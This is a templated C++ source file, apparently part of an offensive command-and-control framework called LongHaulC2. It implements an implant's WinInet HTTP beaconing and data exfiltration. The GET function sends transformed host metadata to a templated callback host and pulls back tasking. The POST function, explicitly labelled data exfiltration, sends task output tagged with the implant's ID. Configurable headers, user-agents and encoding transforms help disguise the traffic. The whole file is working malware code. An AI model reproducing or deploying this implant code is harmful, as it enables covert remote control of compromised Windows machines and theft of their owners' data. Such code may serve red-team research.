[# 
Name: WinInet HTTP get/post functions (LongHaulC2 TOML Variant)
Explanation: Data-driven C2 request generation using Token Replacement.
#]

[% from 'transform.j2' import render_transform %]
[% from 'transform_reverse.j2' import render_reverse_transform %]

#include "protocols/http_wininet/http.h"
#include "modules/metadata.h"
#include "core/settings.h"
#include "data/transforms/transforms.h"
#include "_debug/debug.h"
#include <string>

using namespace std::string_literals;

namespace [[ http_function_name ]] {

    // ====================================================================
    // Token Replacement Helpers
    // ====================================================================
    inline void replace_token(std::wstring& target, const std::wstring& token, const std::wstring& replacement) {
        size_t pos = 0;
        while ((pos = target.find(token, pos)) != std::wstring::npos) {
            target.replace(pos, token.length(), replacement);
            pos += replacement.length();
        }
    }

    inline void replace_token(std::string& target, const std::string& token, const std::string& replacement) {
        size_t pos = 0;
        while ((pos = target.find(token, pos)) != std::string::npos) {
            target.replace(pos, token.length(), replacement);
            pos += replacement.length();
        }
    }

    // ====================================================================
    // BEACON / TASKING (HTTP GET)
    // ====================================================================
    inline std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Initiating GET request");

        // 1. Prepare and Transform Metadata
        std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
        
        [% for step in get_config.client.metadata.transforms | default([]) %]
            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
            [[ render_transform(t_obj, 'metadata') ]]
        [% endfor %]

        std::wstring w_metadata(metadata.begin(), metadata.end());
        
        // 2. Build URI and Parameters
        std::wstring uri = L"[[ get_config.uri ]]";
        replace_token(uri, L"<METADATA>", w_metadata);

        std::wstring query_string = L"";
        [% for param in get_config.client.parameters | default([]) %]
            [% for k, v in param.items() %]
            {
                std::wstring key = L"[[ k ]]";
                std::wstring val = L"[[ v ]]";
                replace_token(val, L"<METADATA>", w_metadata);
                
                if (!query_string.empty()) query_string += L"&";
                query_string += key + L"=" + val;
            }
            [% endfor %]
        [% endfor %]

        if (!query_string.empty()) {
            uri += (uri.find(L'?') != std::wstring::npos) ? L"&" : L"?";
            uri += query_string;
        }

        // 3. Build Headers
        std::vector<std::wstring> headers;
        headers.push_back(L"User-Agent: [[ get_useragent ]]"); 

        [% for header in get_config.client.headers | default([]) %]
            [% for k, v in header.items() %]
            {
                std::wstring key = L"[[ k ]]";
                std::wstring val = L"[[ v ]]";
                replace_token(val, L"<METADATA>", w_metadata);
                headers.push_back(key + L": " + val);
            }
            [% endfor %]
        [% endfor %]

        // 4. Build Body
        std::string request_body = "[[ get_config.client.body | default('') ]]";
        replace_token(request_body, "<METADATA>", metadata);

        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Final URI: " + std::string(uri.begin(), uri.end()));

        // 5. Execute HTTP Request
        std::string http_response_buffer;
        if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"GET", uri, headers, request_body, http_response_buffer)) {
            
            if (http_response_buffer.empty()) return std::vector<uint8_t>{};

            // 6. Reverse Server Transforms
            [% for step in get_config.server.output.transforms | default([]) | reverse %]
                [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
                [[ render_reverse_transform(t_obj, 'http_response_buffer') ]]
            [% endfor %]

            return std::vector<uint8_t>(http_response_buffer.begin(), http_response_buffer.end());
        } 
        
        return std::vector<uint8_t>{};
    }

    // ====================================================================
    // DATA EXFILTRATION (HTTP POST)
    // ====================================================================
    inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Initiating POST");

        // 1. Prepare and Transform ID & Payload
        std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
        
        [% for step in post_config.client.id.transforms | default([]) %]
            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
            [[ render_transform(t_obj, 'implant_uuid') ]]
        [% endfor %]

        [% for step in post_config.client.output.transforms | default([]) %]
            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
            [[ render_transform(t_obj, 'payload') ]]
        [% endfor %]

        std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
        std::wstring w_payload(payload.begin(), payload.end());

        // 2. Build URI and Parameters
        std::wstring uri = L"[[ post_config.uri ]]";
        replace_token(uri, L"<CLIENT_ID>", w_id);
        replace_token(uri, L"<OUTPUT>", w_payload);

        std::wstring query_string = L"";
        [% for param in post_config.client.parameters | default([]) %]
            [% for k, v in param.items() %]
            {
                std::wstring key = L"[[ k ]]";
                std::wstring val = L"[[ v ]]";
                replace_token(val, L"<CLIENT_ID>", w_id);
                replace_token(val, L"<OUTPUT>", w_payload);
                
                if (!query_string.empty()) query_string += L"&";
                query_string += key + L"=" + val;
            }
            [% endfor %]
        [% endfor %]

        if (!query_string.empty()) {
            uri += (uri.find(L'?') != std::wstring::npos) ? L"&" : L"?";
            uri += query_string;
        }

        // 3. Build Headers
        std::vector<std::wstring> headers;
        headers.push_back(L"User-Agent: [[ post_useragent ]]");
        
        [% for header in post_config.client.headers | default([]) %]
            [% for k, v in header.items() %]
            {
                std::wstring key = L"[[ k ]]";
                std::wstring val = L"[[ v ]]";
                replace_token(val, L"<CLIENT_ID>", w_id);
                replace_token(val, L"<OUTPUT>", w_payload);
                headers.push_back(key + L": " + val);
            }
            [% endfor %]
        [% endfor %]

        // 4. Build Body
        std::string request_body = "[[ post_config.client.body | default('') ]]";
        replace_token(request_body, "<CLIENT_ID>", implant_uuid);
        replace_token(request_body, "<OUTPUT>", payload);

        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Final POST URI: " + std::string(uri.begin(), uri.end()));

        // 5. Execute HTTP Request
        std::string response_buffer;
        if (!HTTP_POST(L"[[callback_host]]", [[callback_port]], L"POST", uri, headers, request_body, response_buffer)) {
            return 1;
        }
        
        return 0;
    }
}